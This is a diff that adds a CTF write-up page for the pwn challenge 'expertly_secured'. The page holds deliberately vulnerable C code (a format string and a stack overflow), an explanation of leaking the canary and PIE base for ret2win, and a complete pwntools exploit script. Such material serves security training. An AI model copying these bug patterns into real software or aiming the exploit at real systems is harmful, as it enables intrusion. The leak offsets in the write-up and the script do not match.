@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>expertly_secured // Rogue_Net</title>
+    <meta name="description" content="# Expertly Secured ## Description Our system is so secure, it&#39;s actually insulting that you&#39;re even trying to look at it. We&#39;ve implemented the latest">
+    <link rel="stylesheet" href="../../../static/css/style.css">
+</head>
+<body>
+    <!-- Genjutsu Transition Overlay -->
+    <div class="genjutsu-overlay initial-closed" id="genjutsuOverlay">
+        <div class="eyelid eyelid-top"></div>
+        <div class="eyelid eyelid-bottom"></div>
+        <div class="genjutsu-eye">
+                <svg viewBox="0 0 200 200">
+                    <circle cx="100" cy="100" r="94" fill="var(--blood-red)" stroke="#000" stroke-width="10"/>
+                    <!-- Base 3-Tomoe -->
+                    <g class="base-sharingan" style="transform-origin: 100px 100px;">
+                        <circle cx="100" cy="100" r="90" fill="var(--blood-red)"/>
+                        <circle cx="100" cy="100" r="16" fill="#000"/>
+                        <circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/>
+                        <g class="tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(120deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(240deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                    </g>
+                    <!-- Uploaded Image Mangekyo -->
+                    <defs>
+                        <clipPath id="circleClip">
+                            <circle cx="100" cy="100" r="98" />
+                        </clipPath>
+                    </defs>
+                    <image href="../../../static/img/mangekyou.png" x="0" y="0" height="200" width="200" class="mangekyo" style="transform-origin: 100px 100px; opacity: 0; clip-path: url(#circleClip);" />
+                </svg>
+        </div>
+    </div>
+    <div class="scanlines"></div>
+    <div class="scroll-indicator" id="scrollIndicator"></div>
+    <div class="scroll-addr" id="scrollAddr">0x00000000</div>
+    <div class="pwndbg-bg" id="pwndbgBg"></div>
+
+    <div class="container" style="gap: 40px;">
+
+        <a href="../../../index.html" class="back-link">← pwndbg> back</a>
+
+        <div class="chall-header">
+            <h1><span class="prefix">./</span>expertly_secured<span class="cursor-blink">_</span></h1>
+            <div class="chall-meta-row">
+                <span class="tag">PWN</span>
+                <span>FST Bootcamp</span>
+                <span>0x8c87852c</span>
+                
+                
+                <span>
+                    <span class="difficulty">
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                    </span>
+                </span>
+            </div>
+        </div>
+
+        <!-- Description -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DESCRIPTION</div>
+            <div class="code-block">
+                # Expertly Secured ## Description Our system is so secure, it&#39;s actually insulting that you&#39;re even trying to look at it. We&#39;ve implemented the latest &#34;Trust Me Bro&#34; encryption and a state-of-the-art &#34;Close Your Eyes&#34; firewall.
+            </div>
+        </div>
+
+        
+        <!-- Source Code / Disasm -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DISASM // SOURCE</div>
+            
+            <div style="color: var(--amber); margin-bottom: 8px; font-size: 0.9rem;">// challenge.c</div>
+            <div class="code-block" style="max-height: 500px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+void init() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+}
+
+void nothing_to_see_here() {
+    char flag[128];
+    FILE *f = fopen(&#34;flag.txt&#34;, &#34;r&#34;);
+    if (f == NULL) {
+        printf(&#34;[SYSTEM] Wow, you even managed to delete the flag. I&#39;m impressed.\n&#34;);
+        exit(0);
+    }
+    fgets(flag, sizeof(flag), f);
+    printf(&#34;\n[SYSTEM] OH NO! MY TOTALLY SECURE VAULT! HOW DID YOU...: %s\n&#34;, flag);
+    fclose(f);
+}
+
+void unhackable_logging_module() {
+    char buffer[64];
+    printf(&#34;\n[SECURE-LOG] Welcome to the World&#39;s Most Secure Logging(TM) system.\n&#34;);
+    printf(&#34;[SECURE-LOG] Please enter your super-secret Access ID for our top-tier logs: &#34;);
+    
+    // Vulnerability: Format String (Leads to Canary/PIE leak)
+    if (fgets(buffer, sizeof(buffer), stdin) != NULL) {
+        printf(&#34;[SECURE-LOG] Safely logging your ID: &#34;);
+        printf(buffer); 
+    }
+}
+
+void air_gapped_security_gate() {
+    char secure_phrase[32];
+    printf(&#34;\n[GATE] You&#39;ve reached the Air-Gapped gate. Only geniuses can pass.\n&#34;);
+    printf(&#34;[GATE] Whisper the secret password (max 32 chars, we promise we listen): &#34;);
+    
+    // Vulnerability: Buffer Overflow (Canary must be restored)
+    read(0, secure_phrase, 128); 
+    
+    printf(&#34;[GATE] Checking your IQ... Hmm... Access Denied.\n&#34;);
+}
+
+int main() {
+    init();
+    
+    printf(&#34;--- EXPERTLY SECURED v99.9 ---\n&#34;);
+    printf(&#34;Created by The Best Security Researcher(TM)\n&#34;);
+    printf(&#34;Guaranteed 100%% Unhackable by Design.\n&#34;);
+    
+    unhackable_logging_module();
+    air_gapped_security_gate();
+    
+    printf(&#34;[SYSTEM] Final security check passed. You are definitely not a hacker.\n&#34;);
+    return 0;
+}
+</pre>
+            </div>
+            
+        </div>
+        
+
+        
+        <!-- Writeup -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">WRITEUP // WALKTHROUGH</div>
+            <div class="writeup-content">
+                <h1>Expertly Secured — Writeup</h1>
+<h2>Challenge Overview</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>PWN</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>Medium</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td>R3t0x</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Format String + Canary Leak + ret2win</td>
+</tr>
+</tbody>
+</table>
+<h2>Reconnaissance</h2>
+<div class="codehilite"><pre><span></span><code>pwndbg&gt;<span class="w"> </span>checksec<span class="w"> </span>./challenge
+<span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little
+<span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO
+<span class="w">    </span>Stack:<span class="w">    </span>Canary<span class="w"> </span>found
+<span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled
+<span class="w">    </span>PIE:<span class="w">      </span>PIE<span class="w"> </span>enabled
+</code></pre></div>
+
+<p>All protections are on — but there's a <strong>win function</strong> <code>nothing_to_see_here()</code> that reads the flag.</p>
+<h2>Vulnerability Chain</h2>
+<h3>Step 1: Format String Leak</h3>
+<div class="codehilite"><pre><span></span><code><span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="w">  </span><span class="c1">// in unhackable_logging_module()</span>
+</code></pre></div>
+
+<p>Leak the <strong>canary</strong> and a <strong>PIE text address</strong> to defeat both protections.</p>
+<h3>Step 2: Buffer Overflow</h3>
+<div class="codehilite"><pre><span></span><code><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">secure_phrase</span><span class="p">,</span><span class="w"> </span><span class="mi">128</span><span class="p">);</span><span class="w">  </span><span class="c1">// 128 into 32 — in air_gapped_security_gate()</span>
+</code></pre></div>
+
+<p>Overflow past <code>secure_phrase</code>, <strong>restore the canary</strong>, then overwrite RIP with <code>nothing_to_see_here()</code>.</p>
+<h2>Exploit</h2>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Leak canary and PIE</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;ID: &quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;%11$p.%13$p&quot;</span><span class="p">)</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">pie_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leaks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">known_offset</span>
+
+<span class="c1"># Overflow with restored canary</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">40</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pie_base</span> <span class="o">+</span> <span class="n">win_offset</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;password&quot;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</code></pre></div>
+
+<h2>Result</h2>
+<div class="codehilite"><pre><span></span><code><span class="o">[</span><span class="n">SYSTEM</span><span class="o">]</span><span class="w"> </span><span class="n">OH</span><span class="w"> </span><span class="k">NO</span><span class="err">!</span><span class="w"> </span><span class="n">MY</span><span class="w"> </span><span class="n">TOTALLY</span><span class="w"> </span><span class="n">SECURE</span><span class="w"> </span><span class="n">VAULT</span><span class="err">!</span><span class="w"> </span><span class="n">HOW</span><span class="w"> </span><span class="n">DID</span><span class="w"> </span><span class="n">YOU</span><span class="p">...</span><span class="err">:</span>
+<span class="n">FST</span><span class="err">{</span><span class="mi">3</span><span class="n">xp3rtly_s3cur3d_my_4ss</span><span class="err">}</span>
+</code></pre></div>
+            </div>
+        </div>
+        
+
+        
+        <!-- Exploit / Solver -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">EXECUTION // EXPLOIT</div>
+            <div style="color: var(--text-muted); margin-bottom: 10px; font-size: 0.85rem;">
+                <span style="color: var(--gdb-green);">$</span> python3 solve.py
+            </div>
+            <div class="code-block" style="max-height: 600px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">from pwn import *
+
+context.binary = binary = ELF(&#39;./main&#39;, checksec=False)
+
+def get_process():
+    if args.REMOTE:
+        return remote(&#39;48.220.35.76&#39;, 1337)
+    else:
+        return process(binary.path)
+
+io = get_process()
+
+payload = &#34;%15$p.%17$p&#34;
+io.sendlineafter(b&#34;top-tier logs: &#34;, payload.encode())
+
+io.recvuntil(b&#34;Safely logging your ID: &#34;)
+leaks = io.recvline().strip().decode().split(&#39;.&#39;)
+canary = int(leaks[0], 16)
+leaked_addr = int(leaks[1], 16)
+
+
+base = leaked_addr - 0x1507
+binary.address = base
+
+success(f&#34;Canary: {hex(canary)}&#34;)
+success(f&#34;PIE Base: {hex(base)}&#34;)
+
+# Gadgets and Targets
+ret = base + 0x101a
+target = base + 0x12d5 # nothing_to_see_here
+
+
+offset_to_canary = 40
+payload = b&#34;A&#34; * offset_to_canary
+payload += p64(canary)
+payload += b&#34;B&#34; * 8 # saved rbp
+payload += p64(ret) # stack alignment
+payload += p64(target)
+
+io.sendlineafter(b&#34;we promise we listen): &#34;, payload)
+
+try:
+    print(io.recvall(timeout=5).decode())
+except Exception as e:
+    print(f&#34;Error: {e}&#34;)
+io.close()
+</pre>
+            </div>
+        </div>
+        
+
+        <div style="height: 80px;"></div>
+    </div>
+
+    <script src="../../../static/js/main.js"></script>
+</body>
+</html>
